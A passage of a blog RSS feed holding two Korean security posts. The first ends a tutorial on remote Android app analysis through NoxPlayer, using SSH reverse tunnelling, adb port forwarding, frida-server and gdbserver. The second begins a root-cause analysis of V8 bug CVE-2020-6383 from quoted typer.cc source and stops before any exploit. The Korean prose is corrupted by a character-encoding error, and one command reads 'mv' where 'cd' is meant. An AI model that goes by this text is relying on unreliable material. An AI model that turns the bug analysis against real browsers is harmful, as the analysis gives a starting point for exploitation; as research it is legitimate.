&lt;p&gt;NoxPlayerëŠ” ADB ë¥¼ 127.0.0.1ì„ LISTENING í•˜ê³  ìˆê¸° ë•Œë¬¸ì— ë¦¬ë²„ìŠ¤ í„°ë„ë§ì„ í•„ìš”ë¡œ í•©ë‹ˆë‹¤. ë”°ë¼ì„œ NoxPlayerê°€ ì„¤ì¹˜ëœ ì„œë²„ì—ì„œëŠ” ì•„ë˜ì™€ ê°™ì´ NoxPlayerì˜ ADB portë¥¼ Reverse Tunneling í•´ì£¼ë©´ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# NoxPlayer ADB PORT Reverse Tunneling&lt;/span&gt;
ssh &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; jeon95u@jeong.su &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; 0.0.0.0:62001:127.0.0.1:62001
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;2-ë¶„ì„-pc&quot;&gt;2. ë¶„ì„ PC&lt;/h2&gt;

&lt;h3 id=&quot;1-adb-1&quot;&gt;1. ADB&lt;/h3&gt;

&lt;p&gt;ë¶„ì„ì„ ì§„í–‰í•  PCì—ì„œëŠ” ë¦¬ë²„ìŠ¤ í„°ë„ë§ëœ ì„œë²„ì™€ í¬íŠ¸ë¥¼ í†µí•´ ì„œë²„ì—ì„œ NoxPlayerê°€ ì‹¤í–‰ì¤‘ì¸ Deviceì˜ ADBì— ì ‘ì†í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ADB kill server&lt;/span&gt;
adb kill-server

&lt;span class=&quot;c&quot;&gt;# ADB remote connect &amp;amp; port forwarding (frida-server, gdbserver)&lt;/span&gt;
adb connect jeong.su:62001
adb forward tcp:62000 tcp:62000
adb forward tcp:62002 tcp:62002
adb shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;2-frida-1&quot;&gt;2. Frida&lt;/h3&gt;

&lt;p&gt;Fridaê°€ ì„œë²„ì— ìˆëŠ” NoxPlayerì— ì„¤ì¹˜ë˜ì–´ ìˆì§€ ì•ŠëŠ” ê²½ìš° ìœ„ì™€ ë˜‘ê°™ì€ ë°©ë²•ìœ¼ë¡œ ì„¤ì¹˜ë¥¼ í•´ì¤ë‹ˆë‹¤. ì„¤ì¹˜ê°€ ë˜ì–´ ìˆë‹¤ë©´ ì•„ë˜ì™€ ê°™ì´ frida-serverë¥¼ ì‹¤í–‰ ì‹œì¼œì¤ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; /data/local/tmp/
./frida-server-12.8.7-android-x86 &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 0.0.0.0:62000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;1. ADB&lt;/code&gt;ì—ì„œ adb forward ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¶„ì„ PCì— 62000ì„ ì ‘ì†í•˜ê²Œ ë˜ë©´ ADBë¥¼ íƒ€ê³  ë¦¬ëª¨íŠ¸ì— ìˆëŠ” NoxPlayerì˜ Deviceì˜ 62000ì„ í¬ì›Œë”© í•´ì¤ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ ë¶„ì„ PCì—ì„œ ë°”ë¡œ ì•„ë˜ì™€ ê°™ì´ frida ì‚¬ìš©ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;frida &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 127.0.0.1:62000
frida-ps &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 127.0.0.1:62000

frida &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 127.0.0.1:62000 com.example.app &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; test.js
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;3-gdb-1&quot;&gt;3. GDB&lt;/h3&gt;

&lt;p&gt;GDBê°€ ì„œë²„ì— ìˆëŠ” NoxPlayerì— ì„¤ì¹˜ë˜ì–´ ìˆì§€ ì•ŠëŠ” ê²½ìš° ìœ„ì™€ ë˜‘ê°™ì€ ë°©ë²•ìœ¼ë¡œ ì„¤ì¹˜ë¥¼ í•´ì¤ë‹ˆë‹¤. ì„¤ì¹˜ê°€ ë˜ì–´ ìˆë‹¤ë©´ ì•„ë˜ì™€ ê°™ì´ gdbserverë¥¼ ì‹¤í–‰ ì‹œì¼œì¤ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; /data/local/tmp
./gdbserver 0.0.0.0:62002 &lt;span class=&quot;nt&quot;&gt;--attach&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;PID]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;1. ADB&lt;/code&gt;ì—ì„œ adb forward ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¶„ì„ PCì— 62002ì„ ì ‘ì†í•˜ê²Œ ë˜ë©´ ADBë¥¼ íƒ€ê³  ë¦¬ëª¨íŠ¸ì— ìˆëŠ” NoxPlayerì˜ Deviceì˜ 62002ì„ í¬ì›Œë”© í•´ì¤ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ ë¶„ì„ PCì—ì„œ ë°”ë¡œ ì•„ë˜ì™€ ê°™ì´ gdb ì‚¬ìš©ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb
target remote 127.0.0.1:62002
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;ë§ˆë¬´ë¦¬--ì¶”ê°€-ì—°êµ¬-ê³¼ì œ&quot;&gt;ë§ˆë¬´ë¦¬ &amp;amp; ì¶”ê°€ ì—°êµ¬ ê³¼ì œ&lt;/h1&gt;

&lt;p&gt;iOS í™˜ê²½ì˜ ìŠ¤ë§ˆíŠ¸í°ì„ ì‚¬ìš©í•˜ëŠ” ê²½ìš° ê¸‰í•˜ê²Œ Android ì–´í”Œë¦¬ì¼€ì´ì…˜ì„ ë™ì ìœ¼ë¡œ ë¶„ì„í•˜ê³ ì í•  ë•Œ ìš”ê¸´í•˜ê²Œ ì“°ì´ê³ ì ì‘ì„±ëœ ë¬¸ì„œì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ìœ„ ë°©ë²•ìœ¼ë¡œëŠ” ADB, Frida, GDB ë“± ê°„ë‹¨í•˜ê²Œ CLI í™˜ê²½ì—ì„œ í•  ìˆ˜ ìˆëŠ” ê²ƒë§Œ ì‚¬ìš© ê°€ëŠ¥í•˜ë©° íŠ¹ì • Activity ì‹¤í–‰ ë“±ì€ ëŒ€ë¶€ë¶„ Activity Managerë¥¼ í†µí•´ ADB shellì—ì„œ í˜¸ì¶œì´ ê°€ëŠ¥í•˜ì§€ë§Œ ê·¸ ì™¸ GUIë¥¼ ì‚¬ìš©í•´ì•¼í•˜ëŠ” ê²½ìš°ëŠ” ì¶”ê°€ ì—°êµ¬ê°€ í•„ìš”í•  ê²ƒ ìœ¼ë¡œ ìƒê°ë©ë‹ˆë‹¤.&lt;/p&gt;
</description>
        <pubDate>Wed, 01 Jul 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-07-01/Android-Application-Dynamic-Analysis-in-Remote-Nox</link>
        <guid isPermaLink="true">http://localhost:4000/2020-07-01/Android-Application-Dynamic-Analysis-in-Remote-Nox</guid>
        
        <category>android</category>
        
        <category>frida</category>
        
        
      </item>
    
      <item>
        <title>v8 1 day CVE-2020-6383</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ì¡°ì§„í˜¸&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;summary&lt;/h2&gt;

&lt;p&gt;turbofan ì½”ë“œì—ì„œ v8 type confusion&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=1051017&quot;&gt;1051017 - chromium - An open-source project to help move the web forward. - Monorail&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;issue-1051017-type-inference-issue&quot;&gt;issue 1051017: Type inference issue&lt;/h2&gt;

&lt;p&gt;TurboFan optimize bug&lt;/p&gt;

&lt;h2 id=&quot;vulnerability-details&quot;&gt;Vulnerability details&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://cs.chromium.org/chromium/src/v8/src/compiler/typer.cc?rcl=25c49d2bd6cbdc72b0779545d2a32406657befda&amp;amp;l=845&quot;&gt;https://cs.chromium.org/chromium/src/v8/src/compiler/typer.cc?rcl=25c49d2bd6cbdc72b0779545d2a32406657befda&amp;amp;l=845&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Typer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Visitor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TypeInductionVariablePhi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;both_types_integer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initial_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Is&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;typer_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
                                  &lt;span class=&quot;n&quot;&gt;increment_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Is&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;typer_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maybe_nan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// The addition or subtraction could still produce a NaN, if the integer&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// ranges touch infinity.&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;both_types_integer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resultant_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arithmetic_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InductionVariable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ArithmeticType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kAddition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typer_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;operation_typer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NumberAdd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;initial_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;increment_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typer_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;operation_typer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NumberSubtract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;initial_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;n&quot;&gt;increment_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;maybe_nan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resultant_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Maybe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NaN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// *** 1 ***&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arithmetic_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InductionVariable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ArithmeticType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kAddition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;increment_min&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;increment_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;increment_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;increment_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;DCHECK_EQ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InductionVariable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ArithmeticType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kSubtraction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arithmetic_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;increment_min&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;increment_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;increment_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;increment_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;increment_min&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;increment_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Shortcut: If the increment can be both positive and negative,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// the variable can go arbitrarily far, so just return integer.&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typer_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// *** 2 ***&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì·¨ì•½ì  ë°œìƒ í´ë˜ìŠ¤ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;Typer::Visitor::TypeInductionVariablePhi&lt;/code&gt;ì´ê³  í•´ë‹¹ ì½”ë“œëŠ” ë£¨í”„ ê´€ë ¨í•´ì„œ ìµœì í™”ë¥¼ ì§„í–‰í•˜ë‹¤ê°€ ë°œìƒí•œë‹¤. ë°˜ë³µë¬¸ë“¤ ë„ëŠ” ê²½ìš° &lt;code class=&quot;highlighter-rouge&quot;&gt;for (let i = start; i &amp;lt; end; i+=inc)&lt;/code&gt;ì™€ ê°™ì€ ì½”ë“œê°€ ìˆë‹¤ë©´ &lt;code class=&quot;highlighter-rouge&quot;&gt;inc&lt;/code&gt;ì˜ ë¶€í˜¸ì™€ &lt;code class=&quot;highlighter-rouge&quot;&gt;start&lt;/code&gt;ë¥¼ ë³´ê³  ë„ëŠ” ë°˜ë³µë¬¸ì˜ &lt;code class=&quot;highlighter-rouge&quot;&gt;i&lt;/code&gt;ì˜ ë²”ìœ„ë¥¼ ì§€ì •í•´ì£¼ëŠ” ì½”ë“œì´ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;both_types_integer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initial_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Is&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;typer_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
                                  &lt;span class=&quot;n&quot;&gt;increment_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Is&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;typer_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë¨¼ì € ì—¬ê¸°ì„œ &lt;code class=&quot;highlighter-rouge&quot;&gt;both_types_integer&lt;/code&gt;ë¥¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt;ë¡œ ì„¸íŒ…í•œë‹¤. &lt;code class=&quot;highlighter-rouge&quot;&gt;start&lt;/code&gt;ì™€ &lt;code class=&quot;highlighter-rouge&quot;&gt;inc&lt;/code&gt;ë¥¼ ìˆ«ìë¡œ &lt;code class=&quot;highlighter-rouge&quot;&gt;kInterger&lt;/code&gt;ë¡œ ì„¤ì •í•œë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// The addition or subtraction could still produce a NaN, if the integer&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ranges touch infinity.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;both_types_integer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resultant_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arithmetic_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InductionVariable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ArithmeticType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kAddition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typer_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;operation_typer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NumberAdd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;initial_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;increment_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typer_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;operation_typer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NumberSubtract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;initial_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                      &lt;span class=&quot;n&quot;&gt;increment_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
